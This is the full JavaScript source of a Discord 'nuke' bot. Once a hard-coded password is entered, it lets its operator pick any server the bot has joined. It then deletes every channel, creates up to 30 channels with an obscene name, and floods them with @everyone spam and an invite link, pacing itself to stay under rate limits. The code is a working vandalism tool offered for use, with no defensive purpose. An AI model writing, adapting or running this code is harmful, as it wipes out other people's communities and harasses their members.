const {
  Client,
  GatewayIntentBits,
  EmbedBuilder,
  ActionRowBuilder,
  ButtonBuilder,
  ButtonStyle,
  ModalBuilder,
  TextInputBuilder,
  TextInputStyle,
  StringSelectMenuBuilder,
  MessageFlags
} = require('discord.js');

const express = require('express');
require('dotenv').config();

// PASSWORDS
const MAIN_PASSWORD = 'Meka2017charlie';
const NUKE_PASSWORD = 'meka123';

const userSessions = new Map();

const app = express();
app.get('/', (req, res) => res.send('Bot Online'));
app.listen(process.env.PORT || 3000);

const TOKEN = process.env.TOKEN;

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.MessageContent
  ]
});

client.once('ready', async () => {
  console.log(`${client.user.tag} is online`);
});

// Message Commands
client.on('messageCreate', async message => {
  if (message.author.bot || !message.guild) return;
  const content = message.content.trim().toLowerCase();

  if (content === '!check') {
    const embed = new EmbedBuilder()
      .setColor('#00ff00')
      .setTitle('🔍 Remote Server Control')
      .setDescription('Select any server and perform Raid or Nuke.')
      .setFooter({ text: 'Only you can use this' });

    const row = new ActionRowBuilder().addComponents(
      new ButtonBuilder()
        .setCustomId(`check_start_${message.author.id}`)
        .setLabel('Start')
        .setStyle(ButtonStyle.Primary)
    );

    await message.reply({ embeds: [embed], components: [row] });
  }
  // Keep your other commands (!movebootser, !nukeback, !ate) here if needed
});

// ====================== INTERACTIONS ======================
client.on('interactionCreate', async interaction => {
  if (!interaction.customId) return;

  try {
    const parts = interaction.customId.split('_');
    const action = parts[0];
    const userId = parts[parts.length - 1];

    if (interaction.user.id !== userId) {
      return interaction.reply({ content: '❌ This is not for you.', flags: MessageFlags.Ephemeral });
    }

    if (action === 'check') {
      // ... (password, server select, action select - unchanged) ...
      if (interaction.isButton() && interaction.customId.startsWith('check_start_')) {
        const modal = new ModalBuilder()
          .setCustomId(`check_modal_${interaction.user.id}`)
          .setTitle('Enter Password');
        modal.addComponents(new ActionRowBuilder().addComponents(
          new TextInputBuilder().setCustomId('password').setLabel('Password').setStyle(TextInputStyle.Short).setRequired(true)
        ));
        return await interaction.showModal(modal);
      }

      if (interaction.isModalSubmit() && interaction.customId.startsWith('check_modal_')) {
        const pw = interaction.fields.getTextInputValue('password');
        if (pw !== MAIN_PASSWORD) return interaction.reply({ content: '❌ Wrong password.', flags: MessageFlags.Ephemeral });

        const guilds = Array.from(client.guilds.cache.values());
        const options = guilds.map(g => ({ label: g.name.slice(0, 100), value: g.id }));

        const select = new StringSelectMenuBuilder()
          .setCustomId(`check_server_select_${interaction.user.id}`)
          .setPlaceholder('Select server')
          .addOptions(options);

        await interaction.reply({
          content: '✅ Select a server:',
          components: [new ActionRowBuilder().addComponents(select)],
          flags: MessageFlags.Ephemeral
        });
        userSessions.set(interaction.user.id, {});
      }

      if (interaction.isStringSelectMenu() && interaction.customId.startsWith('check_server_select_')) {
        await interaction.deferUpdate();
        const guildId = interaction.values[0];
        const guild = client.guilds.cache.get(guildId);
        userSessions.set(interaction.user.id, { guildId });

        const actionMenu = new StringSelectMenuBuilder()
          .setCustomId(`check_action_select_${interaction.user.id}`)
          .setPlaceholder('Choose action')
          .addOptions([
            { label: '🔥 Raid', value: 'raid' },
            { label: '☢️ Nuke', value: 'nuke' }
          ]);

        await interaction.editReply({
          content: `**Server:** ${guild.name}\nChoose:`,
          components: [new ActionRowBuilder().addComponents(actionMenu)]
        });
      }

      if (interaction.isStringSelectMenu() && interaction.customId.startsWith('check_action_select_')) {
        await interaction.deferUpdate();
        const choice = interaction.values[0];
        if (choice === 'nuke') {
          const modal = new ModalBuilder()
            .setCustomId(`check_nuke_modal_${interaction.user.id}`)
            .setTitle('Nuke Password');
          modal.addComponents(new ActionRowBuilder().addComponents(
            new TextInputBuilder().setCustomId('password').setLabel('Password').setStyle(TextInputStyle.Short).setRequired(true)
          ));
          return await interaction.showModal(modal);
        }
      }

      // ==================== FIXED NUKE ====================
      if (interaction.isModalSubmit() && interaction.customId.startsWith('check_nuke_modal_')) {
        const pw = interaction.fields.getTextInputValue('password');
        if (pw !== NUKE_PASSWORD) return interaction.reply({ content: '❌ Wrong password.', flags: MessageFlags.Ephemeral });

        await interaction.deferReply({ flags: MessageFlags.Ephemeral });

        const session = userSessions.get(interaction.user.id);
        const guild = client.guilds.cache.get(session?.guildId);
        if (!guild) return interaction.editReply({ content: '❌ Server not found.' });

        await interaction.editReply({ content: `☢️ Nuking **${guild.name}**...` });

        const delay = ms => new Promise(res => setTimeout(res, ms));

        try {
          // Delete everything
          await interaction.followUp({ content: '🗑️ Deleting all channels...', flags: MessageFlags.Ephemeral });
          for (const ch of guild.channels.cache.values()) {
            await ch.delete().catch(() => {});
            await delay(300);
          }

          // Create new channels
          await interaction.followUp({ content: '🔨 Creating FUCKED BY FAME channels...', flags: MessageFlags.Ephemeral });
          const created = [];

          for (let i = 0; i < 30; i++) {   // 30 channels - safe number
            try {
              const chan = await guild.channels.create({
                name: 'fucked-by-fame',
                type: 0,
                reason: 'Fame Nuke'
              });
              created.push(chan);
              await delay(1200); // Slow creation to avoid rate limits
            } catch (e) {
              console.log("Channel limit reached");
              break;
            }
          }

          // Spam
          await interaction.followUp({ content: `💥 Spamming in ${created.length} channels...`, flags: MessageFlags.Ephemeral });
          const invite = 'https://discord.gg/NANQMy3WnD';
          const spam = `@everyone fucked by veynetta ${invite}\n**FAME REAL FAME**`;

          for (const ch of created) {
            for (let i = 0; i < 10; i++) {
              ch.send(spam).catch(() => {});
              if (i % 3 === 0) await delay(500);
            }
          }

          await interaction.followUp({ 
            content: `✅ **NUKE DONE**\nCreated **${created.length}** channels named \`fucked-by-fame\``,
            flags: MessageFlags.Ephemeral 
          });

        } catch (err) {
          console.error(err);
          await interaction.followUp({ content: '⚠️ Error during nuke.', flags: MessageFlags.Ephemeral });
        }

        userSessions.delete(interaction.user.id);
      }
    }
  } catch (err) {
    console.error(err);
    if (!interaction.replied && !interaction.deferred) {
      interaction.reply({ content: '❌ Interaction failed.', flags: MessageFlags.Ephemeral }).catch(() => {});
    }
  }
});

client.login(TOKEN);
